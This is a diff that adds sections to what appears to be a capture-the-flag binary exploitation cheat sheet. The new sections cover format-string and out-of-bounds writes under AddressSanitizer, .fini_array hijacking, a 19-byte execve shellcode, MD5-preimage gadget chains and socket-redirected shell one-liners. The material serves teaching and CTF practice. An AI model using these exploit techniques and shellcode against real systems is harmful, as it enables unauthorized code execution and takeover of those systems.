@@ -198,6 +198,88 @@ payload = flat({
 3. Many records overflow into return address
 4. Overwrite with win function address
 
+## ASAN Shadow Memory Exploitation
+
+**Pattern (Asan-Bazar, Nullcon 2026):** Binary compiled with AddressSanitizer has format string + OOB write vulnerabilities.
+
+**ASAN Shadow Byte Layout:**
+| Shadow Value | Meaning |
+|-------------|---------|
+| `0x00` | Fully accessible (8 bytes) |
+| `0x01-0x07` | Partially accessible (1-7 bytes) |
+| `0xF1` | Stack left redzone |
+| `0xF3` | Stack right redzone |
+| `0xF5` | Stack use after return |
+
+**Key Insight:** ASAN may use a "fake stack" (50% chance) — areas past the ASAN frame have shadow `0x00` on the real stack but different on the fake stack. Detect which by leaking the return address offset.
+
+**Exploitation Pattern:**
+```python
+# 1. Leak PIE base via format string
+payload = b'%8$p'  # Code pointer at known offset
+pie_base = leaked - known_offset
+
+# 2. Detect real vs fake stack
+# Real stack: return address at known offset from format string buffer
+# Check if leaked return address matches expected function offset
+is_real_stack = (ret_addr - pie_base) == 0xdc052  # known offset
+
+# 3. Calculate OOB write offset
+# Format string buffer at stack offset N
+# Target (return address) at stack offset M
+# Distance in bytes = (M - N) * 8
+# Map to ledger system: slot = distance // 16, sub_offset = distance % 16
+
+# 4. Overwrite return address with win() via OOB ledger write
+# Retry until real stack is used (~50% success rate per attempt)
+```
+
+**Single-Interaction Exploitation:** Combine leak + detect + exploit in one format string interaction. If fake stack detected, disconnect and retry.
+
+## Format String with Encoding Constraints + RWX .fini_array Hijack
+
+**Pattern (Encodinator, Nullcon 2026):** Input is base85-encoded into RWX memory at fixed address, then passed to `printf()`.
+
+**Key insight:** Don't try libc-based exploitation. Instead, exploit the RWX mmap region directly:
+
+1. **RWX region at fixed address** (e.g., `0x40000000`): Write shellcode here
+2. **`.fini_array` hijack**: Overwrite `.fini_array[0]` to point to shellcode. When `main()` returns, `__libc_csu_fini` calls `fini_array` entries.
+3. **Format string writes**: Use `%hn` to write 2 bytes at a time to `.fini_array`
+
+**Argument numbering with base85:**
+Base85 decoding changes payload length. The decoded prefix occupies P bytes on stack, so first appended pointer is at arg `6 + P/8`. Use convergence loop:
+
+```python
+arg_base = 20  # Initial guess
+for _ in range(20):
+    fmt = construct_format_string(writes, arg_base)
+    # Pad to base85 group boundary (multiple of 5 encoded = 4 raw)
+    while len(fmt) % 10 != 0:
+        fmt += b"A"
+    prefix = b85_decode(fmt)
+    new_arg_base = 6 + (len(prefix) // 8)
+    if new_arg_base == arg_base:
+        break
+    arg_base = new_arg_base
+```
+
+**Shellcode (19-byte execve):**
+```nasm
+push 0x3b          ; syscall number
+pop rax
+cdq                ; rdx = 0
+movabs rbx, 0x68732f2f6e69622f  ; "/bin//sh"
+push rdx           ; null terminator
+push rbx           ; "/bin//sh"
+push rsp
+pop rdi            ; rdi = pointer to "/bin//sh"
+push rdx
+pop rsi            ; rsi = NULL
+syscall
+```
+
+**Why avoid libc:** Base85 encoding makes precise libc address calculations extremely difficult. The RWX region + .fini_array approach uses only fixed addresses (no ASLR, no PIE concerns for the write target).
+
 ## Custom Canary Preservation
 
 **Pattern (Canary In The Bitcoin Mine):** Buffer overflow must preserve known canary value.
@@ -209,3 +291,99 @@ payload = b'A' * 64 + b'BIRD' + b'X'  # Preserve canary, set target to non-zero
 ```
 
 **Identification:** Source code shows struct with buffer + canary + flag bool, `gets()` for input.
+
+---
+
+## Global Buffer Overflow (CSV Injection)
+
+**Pattern (Spreadsheet):** Adjacent global variables exploitable via overflow.
+
+**Exploitation:**
+1. Identify global array adjacent to filename pointer in memory
+2. Overflow array bounds by injecting extra delimiters (commas in CSV)
+3. Overflowed pointer lands on filename variable
+4. Change filename to `flag.txt`, then trigger read operation
+
+```python
+# Edit last cell with comma-separated overflow
+edit_cell("J10", "whatever,flag.txt")
+save()   # CSV row now has 11 columns
+load()   # Column 11 overwrites savefile pointer with ptr to "flag.txt"
+load()   # Now reads flag.txt into spreadsheet
+print_spreadsheet()  # Shows flag
+```
+
+## MD5 Preimage Gadget Construction
+
+**Pattern (Hashchain, Nullcon 2026):** Server concatenates N MD5 digests and executes them as code. Brute-force preimages with desired byte prefixes.
+
+**Core technique:** Each MD5 digest is 16 bytes. Use `eb 0c` (jmp +12) as first 2 bytes to skip the middle 12 bytes, landing on bytes 14-15 which become a 2-byte instruction:
+
+```c
+// Brute-force MD5 preimage with prefix eb0c and desired 2-byte suffix
+for (uint64_t ctr = 0; ; ctr++) {
+    sprintf(msg + prefix_len, "%016llx", ctr);
+    MD5(msg, msg_len, digest);
+    if (digest[0] == 0xEB && digest[1] == 0x0C) {
+        uint16_t suffix = (digest[14] << 8) | digest[15];
+        if (suffix == target_instruction)
+            break;  // Found!
+    }
+}
+```
+
+**Building i386 syscall chains from 2-byte gadgets:**
+- `31c0` = `xor eax, eax`
+- `89e1` = `mov ecx, esp`
+- `b220` = `mov dl, 0x20`
+- `cd80` = `int 0x80`
+- `40` + NOP = `inc eax`
+
+**Hashchain v2 (4-byte prefix):** Store 4-byte MD5 prefixes at chosen offsets. Build `push <addr>; ret` gadget:
+- Word 0: `68 <low3bytes>` (push instruction, 4 bytes)
+- Word 1: `<high_byte> c3` (remaining byte + ret)
+
+**Brute-force time:** 32-bit prefix match: ~2^32 hashes (~60s on 8 cores). 16-bit: instant.
+
+## .fini_array Hijack
+
+**When to use:** Binary has writable `.fini_array` section and you have an arbitrary write primitive.
+
+**How it works:** When `main()` returns, `__libc_csu_fini` iterates `.fini_array` entries and calls each as a function pointer. Overwrite `.fini_array[0]` with target address (shellcode, win function, etc.).
+
+```python
+# Find .fini_array address
+fini_array = elf.get_section_by_name('.fini_array').header.sh_addr
+# Or: objdump -h binary | grep fini_array
+
+# Overwrite with format string %hn (2-byte writes)
+writes = {
+    fini_array: target_addr & 0xFFFF,
+    fini_array + 2: (target_addr >> 16) & 0xFFFF,
+}
+```
+
+**Advantages over GOT overwrite:** Works even with Full RELRO (`.fini_array` is in a different section). Especially useful when combined with RWX regions for shellcode.
+
+## Shell Tricks
+
+**File descriptor redirection (no reverse shell needed):**
+```bash
+# Redirect stdin/stdout to client socket (fd 3 common for network)
+exec <&3; sh >&3 2>&3
+
+# Or as single command string
+exec<&3;sh>&3
+```
+- Network servers often have client connection on fd 3
+- Avoids firewall issues with outbound connections
+- Works when you have command exec but limited chars
+
+**Find correct fd:**
+```bash
+ls -la /proc/self/fd           # List open file descriptors
+```
+
+**Short shellcode alternatives:**
+- `sh<&3 >&3` - minimal shell redirect
+- Use `$0` instead of `sh` in some shells
